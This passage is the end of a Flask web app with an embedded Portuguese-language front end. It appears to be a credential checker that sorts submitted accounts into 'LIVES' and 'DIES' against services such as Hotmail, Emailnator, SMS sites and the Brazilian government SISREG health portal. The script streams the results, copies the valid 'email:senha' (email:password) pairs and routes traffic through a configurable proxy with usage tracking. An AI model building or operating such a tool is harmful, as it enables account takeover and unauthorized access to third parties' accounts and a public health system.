                    hotmail_keyword: hotmailOpts.keyword,
                    hotmail_mode: hotmailOpts.mode,
                    hotmail_proxy: hotmailOpts.proxy
                })
            }).then(response => response.json()).then(data => {
                if (data.error) {
                    alert(data.error);
                    resetButtons();
                    return;
                }
                eventSource = new EventSource('/stream');
                eventSource.onmessage = function(event) {
                    const data = JSON.parse(event.data);
                    if (data.type === 'total') {
                        numLoaded.innerText = data.total;
                        progressText.textContent = 'Processando 0/' + data.total;
                    } else if (data.type === 'resultado') {
                        const item = data.item;
                        const processados = data.processados;
                        const total = data.total;
                        const lives = data.lives;
                        const dies = data.dies;
                        numLives.innerText = lives;
                        numDies.innerText = dies;
                        numTested.innerText = processados;
                        numLoaded.innerText = total;
                        if (item.resultados_por_api) {
                            for (const [apiName, apiResult] of Object.entries(item.resultados_por_api)) {
                                let statusClass = apiResult.status === 'LIVES' ? 'lives-item' : 'dies-item';
                                let statusIcon = apiResult.status === 'LIVES' ? '✅' : '❌';
                                let link = '#';
                                let apiDisplayName = apiName.toUpperCase();
                                if (apiName === 'mnv') { link = 'https://meunumerovirtual.com'; apiDisplayName = 'MNV'; }
                                else if (apiName === 'sms24h') { link = 'https://sms24h.org'; apiDisplayName = 'SMS24H'; }
                                else if (apiName === 'sisreg') { link = 'https://sisregiii.saude.gov.br'; apiDisplayName = 'SISREG'; }
                                else if (apiName === 'emailnator') { link = 'https://premium.emailnator.com'; apiDisplayName = 'Emailnator'; }
                                else if (apiName === 'hotmail') { link = 'https://outlook.live.com'; apiDisplayName = 'Hotmail'; }
                                let extraInfo = '';
                                if (apiResult.plano) extraInfo = ' | Plano: ' + apiResult.plano;
                                if (apiResult.dados && apiResult.dados.operador) extraInfo = ' | ' + apiResult.dados.operador;
                                if (apiResult.dados && apiResult.dados.perfil) extraInfo += ' | ' + apiResult.dados.perfil;
                                // Country em roxo - formato "🌍 Country: BE"
                                if (apiResult.dados && apiResult.dados.country) {
                                    extraInfo = ' <span style="color: #a855f7;">🌍 Country: ' + apiResult.dados.country + '</span>';
                                }
                                const resultHTML = `
                                    <div class="result-item ${statusClass}">
                                        <strong>${item.numero}</strong>
                                        <br>
                                        <small>
                                            ${statusIcon} ${apiResult.status} | 
                                            ${apiResult.motivo}${extraInfo} | 
                                            <a href="${link}" target="_blank" style="color: #a855f7;">${apiDisplayName}</a>
                                        </small>
                                    </div>
                                `;
                                if (apiResult.status === 'LIVES') {
                                    resultsStore.lives.push(item.numero);
                                    listLives.insertAdjacentHTML('beforeend', resultHTML);
                                } else {
                                    resultsStore.dies.push(item.numero);
                                    listDies.insertAdjacentHTML('beforeend', resultHTML);
                                }
                            }
                        } else {
                            let extraInfo = '';
                            if (item.dados && item.dados.operador && item.dados.operador !== 'N/A') {
                                extraInfo = '<div class="extra-dados">' + item.dados.operador + ' | ' + item.dados.perfil + ' | ' + item.dados.unidade + '</div>';
                            }
                            if (item.dados && item.dados.plano && item.dados.plano !== 'N/A') {
                                extraInfo = '<div class="extra-dados">Plano: ' + item.dados.plano + '</div>';
                            }
                            if (item.dados && item.dados.country) {
                                extraInfo = '<div class="extra-dados">🌍 Country: ' + item.dados.country + '</div>';
                            }
                            const resultHTML = `
                                <div class="result-item ${item.status === 'LIVES' ? 'lives-item' : 'dies-item'}">
                                    ${item.numero}
                                    <small>${item.status === 'LIVES' ? '✅' : '❌'} ${item.motivo}</small>
                                    ${extraInfo}
                                </div>
                            `;
                            if (item.status === 'LIVES') {
                                resultsStore.lives.push(item.numero);
                                listLives.insertAdjacentHTML('beforeend', resultHTML);
                            } else {
                                resultsStore.dies.push(item.numero);
                                listDies.insertAdjacentHTML('beforeend', resultHTML);
                            }
                        }
                        progressText.textContent = 'Processando ' + processados + '/' + total + ' | Lives: ' + lives + ' | Dies: ' + dies;
                        const lastList = item.status === 'LIVES' ? listLives : listDies;
                        if (lastList) lastList.scrollTop = lastList.scrollHeight;
                    } else if (data.type === 'finalizado') {
                        progressText.textContent = 'Concluido! Lives: ' + data.lives + ' | Dies: ' + data.dies + ' | Total: ' + data.total;
                        numLoaded.innerText = data.total;
                        resetButtons();
                        if (eventSource) {
                            eventSource.close();
                            eventSource = null;
                        }
                    }
                };
                eventSource.onerror = function() {
                    if (eventSource) {
                        eventSource.close();
                        eventSource = null;
                    }
                    if (isProcessing) resetButtons();
                };
            }).catch(error => {
                console.error('Erro:', error);
                alert("Erro ao processar dados.");
                resetButtons();
            });
        }

        function stopProcessing() {
            fetch('/stop', { method: 'POST' })
            .then(() => {
                progressText.textContent = 'Parado pelo usuario';
                resetButtons();
                if (eventSource) {
                    eventSource.close();
                    eventSource = null;
                }
            }).catch(() => resetButtons());
        }

        // O navegador pode restaurar o textarea ao recarregar ou voltar pelo historico.
        // Cancela a execucao anterior no servidor e inicia a pagina sem resultados antigos.
        window.addEventListener('pageshow', function() {
            fetch('/stop', { method: 'POST', keepalive: true }).catch(() => {});
            resetTestState(true);
        });

        function resetButtons() {
            isProcessing = false;
            btnStart.disabled = false;
            btnStart.style.display = 'block';
            btnStop.style.display = 'none';
            processingStatus.classList.remove('active');
        }

        function copyResults(type, event) {
            const list = type.includes('lives') ? listLives : listDies;
            const store = type.includes('lives') ? resultsStore.lives : resultsStore.dies;
            const items = list.querySelectorAll('.result-item');
            if (items.length === 0) {
                alert('Nenhum resultado para copiar!');
                return;
            }
            let text = '';
            if (type.includes('full')) {
                // Copia tudo (completo)
                text = Array.from(items).map(item => item.innerText.trim()).filter(Boolean).join('\\n\\n');
            } else {
                // Copia somente logs (email:senha)
                text = store.join('\\n');
            }
            navigator.clipboard.writeText(text).then(() => {
                const btn = event && (event.target || window.event.target);
                if (!btn) return;
                const originalText = btn.textContent;
                btn.textContent = 'COPIADO!';
                setTimeout(() => { btn.textContent = originalText; }, 1500);
            }).catch(() => alert('Erro ao copiar!'));
        }

        // ========== PROXY ==========
        function updateProxyStats() {
            fetch('/api/proxy_usage').then(res => res.json()).then(data => {
                const mb = (data.used / (1024 * 1024)).toFixed(2);
                document.getElementById('usageText').innerText = mb + 'MB / 1024MB';
                document.getElementById('proxyWarning').style.display = data.used > 950 * 1024 * 1024 ? 'block' : 'none';
            });
        }
        setInterval(updateProxyStats, 5000);
        updateProxyStats();

        function loadProxyState() {
            fetch('/api/get_proxy_state').then(res => res.json()).then(data => {
                document.getElementById('proxyUrlInput').value = '';
                document.getElementById('proxyStatus').innerHTML = ' Nenhum proxy configurado';
                document.getElementById('proxyStatus').style.color = '#8c8d9e';
            });
        }
        loadProxyState();

        function setProxy() {
            const url = document.getElementById('proxyUrlInput').value.trim();
            if (!url) { alert('Por favor, insira uma URL de proxy valida!'); return; }
            fetch('/api/set_proxy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ proxy_url: url })
            }).then(res => res.json()).then(data => {
                if (data.success) {
                    document.getElementById('proxyStatus').innerHTML = ' Proxy configurado';
                    document.getElementById('proxyStatus').style.color = '#05FF75';
                    if (data.is_cached) {
                        alert('Proxy reconhecido do cache! Continuando com ' + (data.used_bytes / (1024 * 1024)).toFixed(2) + 'MB usados.');
                    } else {
                        alert('Proxy novo configurado! Comecando do 0 MB.');
                    }
                    updateProxyStats();
                } else {
                    alert('Erro ao configurar proxy: ' + data.error);
                }
            }).catch(err => alert('Erro de comunicacao com o servidor'));
        }

        function clearProxy() {
            if (!confirm('Tem certeza que deseja limpar o proxy configurado?')) return;
            fetch('/api/clear_proxy', { method: 'POST' }).then(res => res.json()).then(data => {
                if (data.success) {
                    document.getElementById('proxyUrlInput').value = '';
                    document.getElementById('proxyStatus').innerHTML = ' Nenhum proxy configurado';
                    document.getElementById('proxyStatus').style.color = '#8c8d9e';
                    updateProxyStats();
                    alert('Proxy removido com sucesso!');
                }
            }).catch(err => alert('Erro ao remover proxy'));
        }

        // Inicializa estado do Hotmail
        document.addEventListener('DOMContentLoaded', function() {
            // Verifica se Hotmail esta marcado inicialmente
            const hotmailCheckbox = document.getElementById('api-hotmail');
            const hotmailOptions = document.getElementById('hotmailOptions');
            if (hotmailCheckbox && hotmailCheckbox.checked) {
                hotmailOptions.classList.add('show');
            }
            toggleKeywordField();
        });

        // ========== CANVAS PARTICLES ==========
        const canvas = document.getElementById('network-canvas');
        const ctx = canvas.getContext('2d');
        let width, height;
        let particles = [];
        const PARTICLE_COUNT = 50;
        const CONNECTION_DISTANCE = 150;

        function resize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resize);
        resize();

        class Particle {
            constructor() {
                this.x = Math.random() * width;
                this.y = Math.random() * height;
                this.vx = (Math.random() - 0.5) * 0.5;
                this.vy = (Math.random() - 0.5) * 0.5;
                this.radius = Math.random() * 1.5 + 0.5;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > width) this.vx *= -1;
                if (this.y < 0 || this.y > height) this.vy *= -1;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                ctx.fillStyle = '#6b2bff';
                ctx.shadowBlur = 5;
                ctx.shadowColor = '#6b2bff';
                ctx.fill();
                ctx.shadowBlur = 0;
            }
        }

        for (let i = 0; i < PARTICLE_COUNT; i++) {
            particles.push(new Particle());
        }

        function animate() {
            ctx.clearRect(0, 0, width, height);
            particles.forEach(p => { p.update(); p.draw(); });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < CONNECTION_DISTANCE) {
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = 'rgba(107, 43, 255, ' + (1 - dist / CONNECTION_DISTANCE) + ')';
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animate);
        }
        animate();

        // ========== CARD HOVER ==========
        document.querySelectorAll('.premium-card').forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const rotateX = ((y - rect.height / 2) / rect.height / 2) * -3;
                const rotateY = ((x - rect.width / 2) / rect.width / 2) * 3;
                card.style.transform = 'perspective(800px) rotateX(' + rotateX + 'deg) rotateY(' + rotateY + 'deg) scale3d(1.02, 1.02, 1.02)';
            });
            card.addEventListener('mouseleave', () => {
                card.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)';
            });
        });
    </script>
</body>
</html>
"""

@app.route('/health')
def health():
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
